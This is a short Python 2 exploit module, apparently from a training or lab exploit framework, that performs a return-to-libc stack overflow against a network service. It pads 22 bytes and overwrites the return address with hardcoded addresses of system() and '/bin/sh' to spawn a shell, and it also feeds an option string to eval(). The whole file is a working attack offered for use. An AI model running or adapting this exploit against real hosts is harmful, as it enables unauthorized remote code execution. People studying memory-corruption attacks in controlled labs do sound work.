#coding:UTF-8
'''Return2libc(DEP - on, ALSR - off)'''

import socket
import struct
import sys
sys.path.append("..")
import payloads
from payloads import *
# from pwn import *

class exploit(object):
    'exploit1'
    def __init__(self, options):
        self.options = options
        # self.info = {'ret':0xbffff180, 'offset':22}
        self.info = {
            'ret':0xdeadbeef,
            'system':0xb7d79430,
            'binsh':0xb7e9afb8,
            'offset':22
            }
    def test(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['dPort'])))
        payload = eval(self.options['payload']).payload()

        ret_addr = struct.pack('<I', self.info['ret'])
        system_addr = struct.pack('<I', self.info['system'])
        binsh_addr = struct.pack('<I', self.info['binsh'])

        # data = 'A' * self.info['offset'] + ret_addr + payload.data
        data = 'A' * self.info['offset'] + system_addr + ret_addr + binsh_addr
        print data
        s.send(data)
        s.close()

if __name__=='__main__':
    pass
